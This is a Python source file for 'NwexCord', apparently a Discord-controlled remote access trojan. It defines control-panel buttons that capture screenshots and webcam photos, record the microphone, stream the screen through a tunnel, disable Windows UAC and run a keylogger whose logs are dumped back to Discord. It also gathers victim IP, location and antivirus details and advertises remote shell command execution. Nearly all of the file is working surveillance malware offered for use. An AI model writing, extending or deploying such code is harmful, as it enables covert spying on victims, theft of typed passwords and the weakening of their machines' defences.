import discord
import asyncio
import hashlib
import io
import tempfile
from datetime import datetime
from core.info import get_sys_info
from Tools.System.manager import SystemManager
from Tools.System.livescreen import LiveStreamManager
from Tools.System.performance import build_performance_embed, PerformanceView, _progress_bar


def _get_startup_view():
    from core.views import StartupView
    return StartupView


class ListenerDurationModal(discord.ui.Modal, title="Microphone Listener"):
    """Modal to input recording duration in seconds."""
    duration_input = discord.ui.TextInput(
        label="Duration (seconds)",
        placeholder="e.g. 10",
        default="5",
        required=True,
        max_length=4
    )

    async def on_submit(self, interaction: discord.Interaction):
        try:
            duration = int(str(self.duration_input).strip())
            if duration < 1 or duration > 300:
                await interaction.response.send_message("❌ Duration must be between 1 and 300 seconds.", ephemeral=True)
                return
        except ValueError:
            await interaction.response.send_message("❌ Please enter a valid number.", ephemeral=True)
            return

        loading_embed = discord.Embed(
            title="🎙️ Microphone Listener",
            description=f"⏳ Recording for **{duration} seconds**...\nPlease wait.",
            color=discord.Color.orange()
        )
        loading_embed.set_footer(text="NwexCord • System")
        await interaction.response.edit_message(content=None, embed=loading_embed, view=None)

        loop = asyncio.get_event_loop()
        success, result = await loop.run_in_executor(None, SystemManager.record_microphone, duration)

        if success:
            file = discord.File(result, filename=f"recording_{duration}s.wav")
            done_embed = discord.Embed(
                title="🎙️ Microphone Listener",
                description=f"✅ Recorded **{duration} seconds** of audio.",
                color=discord.Color.green()
            )
            done_embed.set_footer(text="NwexCord • System")
            await interaction.edit_original_response(content=None, embed=done_embed, attachments=[file], view=SystemResultView())
        else:
            err_embed = discord.Embed(
                title="🎙️ Microphone Listener",
                description=f"❌ {result}",
                color=discord.Color.red()
            )
            err_embed.set_footer(text="NwexCord • System")
            await interaction.edit_original_response(content=None, embed=err_embed, view=SystemResultView())


def embed_system_panel():
    """Create the System panel embed."""
    embed = discord.Embed(
        title="⚙️ NwexCord System",
        description=(
            "Select a system action from the buttons below.\n\n"
            "📸 **ScreenShot** — Capture the PC screen\n"
            "📷 **Webcam** — Capture webcam photo\n"
            "📺 **Live Screen** — Stream screen to browser\n"
            "🎙️ **Listener** — Record microphone audio\n"
            "🛡️ **Disable UAC** — Disable User Account Control\n"
            "⌨️ **KeyLogger** — Start/Stop key logging\n"
            "⚡ **Performance** — CPU, RAM & uptime stats"
        ),
        color=discord.Color.from_rgb(47, 49, 54)
    )
    embed.set_footer(text="NwexCord • System Panel")
    return embed


class LiveStreamView(discord.ui.View):
    """View to manage the active Live Stream."""
    def __init__(self, url):
        super().__init__(timeout=None)
        self.url = url
        
        # Open Browser Button
        btn = discord.ui.Button(label="Open Stream in Browser", url=url, style=discord.ButtonStyle.link, emoji="🌐")
        self.add_item(btn)

    @discord.ui.button(label="Stop Stream", emoji="⏹", style=discord.ButtonStyle.danger)
    async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        SystemManager.stop_stream = LiveStreamManager.stop_stream
        success, msg = LiveStreamManager.stop_stream()
        embed = discord.Embed(title="⏹ Live Screen Stopped", description=msg, color=discord.Color.green())
        embed.set_footer(text="NwexCord • System")
        await interaction.response.edit_message(content=None, embed=embed, view=SystemResultView())

class SystemResultView(discord.ui.View):
    """Back button after a system action result."""
    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.button(label="Back to System", emoji="⬅", style=discord.ButtonStyle.secondary)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_system_panel(), attachments=[], view=SystemPanelView())


class ScreenShotSelectView(discord.ui.View):
    """View to select which monitor to screenshot."""
    def __init__(self, monitors):
        super().__init__(timeout=300)
        self.monitors = monitors
        
        # Add a button for each monitor
        for i, bbox in enumerate(monitors):
            btn = discord.ui.Button(label=f"Monitor {i+1}", style=discord.ButtonStyle.primary)
            btn.callback = self.make_callback(bbox, str(i+1))
            self.add_item(btn)
            
        # Add capture all button
        all_btn = discord.ui.Button(label="All Monitors", style=discord.ButtonStyle.success)
        all_btn.callback = self.make_callback(None, "All")
        self.add_item(all_btn)

        # Add back button
        back_btn = discord.ui.Button(label="Back", style=discord.ButtonStyle.secondary)
        back_btn.callback = self.back_callback
        self.add_item(back_btn)

    def make_callback(self, bbox, name):
        async def callback(interaction: discord.Interaction):
            loading = discord.Embed(title="📸 ScreenShot", description=f"⏳ Capturing Screen {name}...", color=discord.Color.greyple())
            loading.set_footer(text="NwexCord • System")
            await interaction.response.edit_message(content=None, embed=loading, view=None)

            loop = asyncio.get_event_loop()
            success, result = await loop.run_in_executor(None, SystemManager.take_screenshot, bbox)

            if success:
                file = discord.File(result, filename=f"screenshot_{name}.png")
                embed = discord.Embed(title="📸 ScreenShot", description=f"✅ Screen {name} captured successfully.", color=discord.Color.green())
                embed.set_image(url=f"attachment://screenshot_{name}.png")
                embed.set_footer(text="NwexCord • System")
                await interaction.edit_original_response(content=None, embed=embed, attachments=[file], view=SystemResultView())
            else:
                embed = discord.Embed(title="📸 ScreenShot", description=f"❌ {result}", color=discord.Color.red())
                embed.set_footer(text="NwexCord • System")
                await interaction.edit_original_response(content=None, embed=embed, view=SystemResultView())
        return callback

    async def back_callback(self, interaction: discord.Interaction):
        await interaction.response.edit_message(content=None, embed=embed_system_panel(), view=SystemPanelView())


class SystemPanelView(discord.ui.View):
    """Main System panel with 6 feature buttons."""
    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.button(label="ScreenShot", emoji="📸", style=discord.ButtonStyle.secondary, row=0)
    async def screenshot_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        monitors = SystemManager.get_monitors()
        if monitors and len(monitors) > 1:
            embed = discord.Embed(
                title="📸 ScreenShot", 
                description=f"Multiple monitors detected ({len(monitors)}). Please select a screen to capture.", 
                color=discord.Color.blurple()
            )
            embed.set_footer(text="NwexCord • System")
            await interaction.response.edit_message(content=None, embed=embed, view=ScreenShotSelectView(monitors))
            return

        loading = discord.Embed(title="📸 ScreenShot", description="⏳ Capturing screen...", color=discord.Color.greyple())
        loading.set_footer(text="NwexCord • System")
        await interaction.response.edit_message(content=None, embed=loading, view=None)

        loop = asyncio.get_event_loop()
        success, result = await loop.run_in_executor(None, SystemManager.take_screenshot, None)

        if success:
            file = discord.File(result, filename="screenshot.png")
            embed = discord.Embed(title="📸 ScreenShot", description="✅ Screen captured successfully.", color=discord.Color.green())
            embed.set_image(url="attachment://screenshot.png")
            embed.set_footer(text="NwexCord • System")
            await interaction.edit_original_response(content=None, embed=embed, attachments=[file], view=SystemResultView())
        else:
            embed = discord.Embed(title="📸 ScreenShot", description=f"❌ {result}", color=discord.Color.red())
            embed.set_footer(text="NwexCord • System")
            await interaction.edit_original_response(content=None, embed=embed, view=SystemResultView())

    @discord.ui.button(label="Webcam", emoji="📷", style=discord.ButtonStyle.secondary, row=0)
    async def webcam_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        loading = discord.Embed(title="📷 Webcam", description="⏳ Capturing webcam...", color=discord.Color.greyple())
        loading.set_footer(text="NwexCord • System")
        await interaction.response.edit_message(content=None, embed=loading, view=None)

        loop = asyncio.get_event_loop()
        success, result = await loop.run_in_executor(None, SystemManager.take_webcam)

        if success:
            file = discord.File(result, filename="webcam.png")
            embed = discord.Embed(title="📷 Webcam", description="✅ Webcam captured successfully.", color=discord.Color.green())
            embed.set_image(url="attachment://webcam.png")
            embed.set_footer(text="NwexCord • System")
            await interaction.edit_original_response(content=None, embed=embed, attachments=[file], view=SystemResultView())
        else:
            embed = discord.Embed(title="📷 Webcam", description=f"❌ {result}", color=discord.Color.red())
            embed.set_footer(text="NwexCord • System")
            await interaction.edit_original_response(content=None, embed=embed, view=SystemResultView())

    @discord.ui.button(label="Live Screen", emoji="📺", style=discord.ButtonStyle.success, row=0)
    async def livescreen_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if LiveStreamManager._is_running and LiveStreamManager._public_url:
            embed = discord.Embed(title="📺 Live Screen Active", description="The stream is already running.", color=discord.Color.green())
            embed.set_footer(text="NwexCord • System")
            await interaction.response.edit_message(content=None, embed=embed, view=LiveStreamView(LiveStreamManager._public_url))
            return

        loading = discord.Embed(title="📺 Live Screen", description="⏳ Initializing server and creating secure tunnel...\nThis may take up to 15 seconds.", color=discord.Color.orange())
        loading.set_footer(text="NwexCord • System")
        await interaction.response.edit_message(content=None, embed=loading, view=None)

        loop = asyncio.get_event_loop()
        success, result = await loop.run_in_executor(None, LiveStreamManager.start_stream)
        
        if success:
            embed = discord.Embed(
                title="📺 Live Screen Ready!", 
                description=f"✅ Stream is online.\n\n🌐 **URL:** {result}\n\n*Note: Quality is adjusted to ensure smooth streaming. Click the button below to watch.*", 
                color=discord.Color.green()
            )
            embed.set_footer(text="NwexCord • System")
            await interaction.edit_original_response(content=None, embed=embed, view=LiveStreamView(result))
        else:
            embed = discord.Embed(title="📺 Live Screen Failed", description=f"❌ {result}", color=discord.Color.red())
            embed.set_footer(text="NwexCord • System")
            await interaction.edit_original_response(content=None, embed=embed, view=SystemResultView())

    @discord.ui.button(label="Listener", emoji="🎙️", style=discord.ButtonStyle.secondary, row=1)
    async def listener_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(ListenerDurationModal())

    @discord.ui.button(label="Disable UAC", emoji="🛡️", style=discord.ButtonStyle.danger, row=1)
    async def uac_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        loop = asyncio.get_event_loop()
        success, msg = await loop.run_in_executor(None, SystemManager.disable_uac)
        status = "✅" if success else "❌"
        color = discord.Color.green() if success else discord.Color.red()
        embed = discord.Embed(title=f"{status} Disable UAC", description=msg, color=color)
        embed.set_footer(text="NwexCord • System")
        await interaction.edit_original_response(content=None, embed=embed, view=SystemResultView())

    @discord.ui.button(label="KeyLogger", emoji="⌨️", style=discord.ButtonStyle.secondary, row=1)
    async def keylogger_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        # Show keylogger sub-panel
        is_running = SystemManager._keylogger_running
        status_text = "🟢 **Running**" if is_running else "🔴 **Stopped**"
        logged = SystemManager.get_keylogger_dump()
        log_preview = logged[-500:] if len(logged) > 500 else logged
        desc = f"Status: {status_text}\n\n"
        if log_preview:
            desc += f"**Last logged keys:**\n```\n{log_preview}\n```"
        else:
            desc += "*No keys logged yet.*"
        embed = discord.Embed(title="⌨️ KeyLogger", description=desc, color=discord.Color.from_rgb(47, 49, 54))
        embed.set_footer(text="NwexCord • System")
        await interaction.response.edit_message(content=None, embed=embed, view=KeyLoggerView())

    @discord.ui.button(label="Performance", emoji="⚡", style=discord.ButtonStyle.secondary, row=1)
    async def performance_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        loading = discord.Embed(title="⚡ Performance", description="⏳ Gathering performance data...", color=discord.Color.greyple())
        loading.set_footer(text="NwexCord • System")
        await interaction.response.edit_message(content=None, embed=loading, view=None)

        loop = asyncio.get_event_loop()
        data = await loop.run_in_executor(None, SystemManager.get_performance)
        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
        embed = build_performance_embed(session_id, data)
        await interaction.edit_original_response(content=None, embed=embed, view=PerformanceView(session_id))

    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary, row=2)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        info = get_sys_info()
        left_col = (
            f"🌐 **IP** : {info.get('IP', 'Unknown')}\n"
            f"👤 **UserName** : {info['UserName']}\n"
            f"🖥️ **PCName** : {info['PCName']}\n"
            f"🪟 **OS** : {info['OS']}\n"
            f"📁 **Client** : {info['Client']}\n"
            f"⚙️ **Process** : {info['Process']}\n"
            f"📅 **DateTime** : {info['DateTime']}\n"
            f"🎇 **GPU** : {info['GPU']}\n"
            f"🧠 **CPU** : {info['CPU']}\n"
            f"🏷️ **Identifier** : {info['Identifier']}\n"
            f"📊 **Ram** : {info['Ram']}"
        )
        right_col = (
            f"📍 **Location** : {info.get('Location', 'Unknown')}\n"
            f"⏱️ **LastReboot** : {info['LastReboot']}\n"
            f"🛡️ **Antivirus** : {info['Antivirus']}\n"
            f"⚠️ **Firewall** : {info['Firewall']}\n"
            f"🌐 **MacAddress** : {info['MacAddress']}\n"
            f"🌍 **DefaultBrowser** : {info['DefaultBrowser']}\n"
            f"🗣️ **CurrentLang** : {info['CurrentLang']}\n"
            f"💻 **Platform** : {info['Platform']}\n"
            f"📋 **Ver** : {info['Ver']}\n"
            f"🔵 **.Net** : {info['.Net']}\n"
            f"🔋 **Battery** : {info['Battery']}"
        )
        embed = discord.Embed(title="[ Information ]", color=discord.Color.dark_theme())
        embed.add_field(name="\u200b", value=left_col, inline=True)
        embed.add_field(name="\u200b", value=right_col, inline=True)
        embed.set_footer(text=f"NwexCord • System Information • {datetime.now().strftime('Today at %#I:%M %p')}")
        msg_content = f"🚀 **NwexCord System Started!**\nUse `.shell <command>` to execute CMD/PowerShell commands on this machine."
        await interaction.edit_original_response(content=msg_content, embed=embed, view=StartupView())


class KeyLoggerView(discord.ui.View):
    """Sub-panel for KeyLogger with Start, Stop, Dump, Back."""
    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.button(label="Start", emoji="▶", style=discord.ButtonStyle.success, row=0)
    async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        success, msg = SystemManager.start_keylogger()
        status = "✅" if success else "❌"
        embed = discord.Embed(title=f"{status} KeyLogger", description=msg, color=discord.Color.green() if success else discord.Color.red())
        embed.set_footer(text="NwexCord • System")
        await interaction.edit_original_response(content=None, embed=embed, view=KeyLoggerView())

    @discord.ui.button(label="Stop", emoji="⏹", style=discord.ButtonStyle.danger, row=0)
    async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        success, msg, logged = SystemManager.stop_keylogger()
        desc = msg
        if logged:
            if len(logged) > 1500:
                # Send as file
                buf = io.BytesIO(logged.encode('utf-8'))
                buf.seek(0)
                file = discord.File(buf, filename="keylog.txt")
                embed = discord.Embed(title="⏹ KeyLogger Stopped", description=f"{msg}\n\nLogged {len(logged)} characters. See attached file.", color=discord.Color.green())
                embed.set_footer(text="NwexCord • System")
                await interaction.edit_original_response(content=None, embed=embed, attachments=[file], view=KeyLoggerView())
                return
            else:
                desc += f"\n\n**Logged keys:**\n```\n{logged}\n```"
        embed = discord.Embed(title="⏹ KeyLogger Stopped", description=desc, color=discord.Color.green() if success else discord.Color.red())
        embed.set_footer(text="NwexCord • System")
        await interaction.edit_original_response(content=None, embed=embed, view=KeyLoggerView())

    @discord.ui.button(label="Dump", emoji="📄", style=discord.ButtonStyle.primary, row=0)
    async def dump_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        logged = SystemManager.get_keylogger_dump()
        if not logged:
            embed = discord.Embed(title="📄 KeyLogger Dump", description="*No keys logged yet.*", color=discord.Color.greyple())
            embed.set_footer(text="NwexCord • System")
            await interaction.edit_original_response(content=None, embed=embed, view=KeyLoggerView())
            return
        if len(logged) > 1500:
            buf = io.BytesIO(logged.encode('utf-8'))
            buf.seek(0)
            file = discord.File(buf, filename="keylog_dump.txt")
            embed = discord.Embed(title="📄 KeyLogger Dump", description=f"Logged {len(logged)} characters. See attached file.", color=discord.Color.blue())
            embed.set_footer(text="NwexCord • System")
            await interaction.edit_original_response(content=None, embed=embed, attachments=[file], view=KeyLoggerView())
        else:
            embed = discord.Embed(title="📄 KeyLogger Dump", description=f"```\n{logged}\n```", color=discord.Color.blue())
            embed.set_footer(text="NwexCord • System")
            await interaction.edit_original_response(content=None, embed=embed, view=KeyLoggerView())

    @discord.ui.button(label="Back to System", emoji="⬅", style=discord.ButtonStyle.secondary, row=1)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_system_panel(), attachments=[], view=SystemPanelView())


# ========================================
# Windows Panel
# ========================================

